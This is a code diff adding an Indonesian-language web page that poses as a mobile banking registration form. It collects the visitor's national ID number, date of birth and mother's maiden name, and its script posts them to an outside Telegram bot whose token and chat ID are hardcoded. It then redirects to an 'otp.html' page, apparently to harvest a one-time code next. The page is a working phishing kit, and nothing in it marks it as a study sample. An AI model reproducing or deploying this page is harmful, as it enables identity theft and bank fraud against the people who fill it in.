@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Registrasi Mobile Banking</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f7;
+    color: #000;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+  header {
+    background-color: #2196f3;
+    color: white;
+    font-weight: 700;
+    font-size: 18px;
+    text-align: center;
+    padding: 14px 0;
+    position: relative;
+  }
+  .back-icon {
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 24px;
+    height: 24px;
+    cursor: pointer;
+  }
+  .back-icon svg {
+    stroke: white;
+    stroke-width: 2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
+  main {
+    flex: 1;
+    padding: 24px 24px 0 24px;
+  }
+  label {
+    display: block;
+    margin-bottom: 6px;
+    font-size: 14px;
+    font-weight: 600;
+  }
+  input[type="text"],
+  input[type="date"] {
+    width: 100%;
+    padding: 14px 16px;
+    border-radius: 12px;
+    border: none;
+    background-color: white;
+    box-sizing: border-box;
+    font-size: 16px;
+    margin-bottom: 20px;
+    color: #555;
+    outline: none;
+  }
+  input[type="date"] {
+    cursor: pointer;
+  }
+  /* Calendar icon inside date input */
+  input[type="date"]::-webkit-calendar-picker-indicator {
+    cursor: pointer;
+    filter: invert(32%) sepia(35%) saturate(746%) hue-rotate(160deg) brightness(89%) contrast(87%);
+  }
+  
+  button {
+    width: 100%;
+    background-color: #2196f3;
+    border: none;
+    padding: 14px 0;
+    font-size: 16px;
+    font-weight: 700;
+    color: white;
+    border-radius: 12px;
+    cursor: pointer;
+    user-select: none;
+    box-shadow: 0 4px 8px rgba(33, 150, 243, 0.35);
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #1769c1;
+  }
+</style>
+</head>
+<body>
+  <header>
+    <div class="back-icon" aria-label="Kembali" role="button" tabindex="0" onclick="history.back();">
+      <svg viewBox="0 0 24 24" fill="none">
+        <path d="M15 18L9 12L15 6" />
+      </svg>
+    </div>
+    Registrasi Mobile Banking
+  </header>
+
+  <main>
+    <form id="registrationForm">
+      <label for="noKTP">Nomor KTP</label>
+      <input type="text" id="noKTP" name="noKTP" placeholder="Masukkan Nomor KTP" inputmode="numeric" required maxlength="20" />
+
+      <label for="tglLahir">Tanggal Lahir</label>
+      <input type="date" id="tglLahir" name="tglLahir" placeholder="Pilih Tanggal Lahir" required max="" />
+
+      <label for="namaIbu">Nama Ibu Kandung</label>
+      <input type="text" id="namaIbu" name="namaIbu" placeholder="Masukkan Nama Ibu Kandung" required />
+
+      <button type="submit">Selanjutnya</button>
+    </form>
+  </main>
+
+<script>
+  // Set maksimal tanggal lahir adalah hari ini agar tidak bisa pilih tanggal di masa depan
+  document.getElementById('tglLahir').max = new Date().toISOString().split('T')[0];
+
+  const form = document.getElementById('registrationForm');
+
+  // Ganti dengan token bot Telegram Anda
+  const BOT_TOKEN = '8561612812:AAErTJ9Ml39kQgb0NP4UEpIgda-buNk-6Co'; 
+  // Ganti dengan chat ID tujuan pesan Telegram
+  const CHAT_ID = '392836663';
+
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    // Ambil data input
+    const noKTP = document.getElementById('noKTP').value.trim();
+    const tglLahir = document.getElementById('tglLahir').value;
+    const namaIbu = document.getElementById('namaIbu').value.trim();
+
+    // Validasi sederhana
+    if(!noKTP) {
+      alert('Nomor KTP harus diisi!');
+      return;
+    }
+    if(!tglLahir) {
+      alert('Tanggal Lahir harus dipilih!');
+      return;
+    }
+    if(!namaIbu) {
+      alert('Nama Ibu Kandung harus diisi!');
+      return;
+    }
+
+    // Buat text pesan ke Telegram
+    const pesan = 
+      `Registrasi Mobile Banking\n` +
+      `Nomor KTP: ${noKTP}\n` + 
+      `Tanggal Lahir: ${tglLahir}\n` + 
+      `Nama Ibu Kandung: ${namaIbu}`;
+
+    // Kirim pesan ke Telegram
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: pesan
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if(data.ok) {
+        window.location.href = "otp.html";
+        form.reset();
+      } else {
+        alert('Gagal mengirim data: ' + data.description);
+      }
+    })
+    .catch(error => {
+      alert('Kesalahan saat mengirim data: ' + error);
+    });
+  });
+</script>
+</body>
+</html>
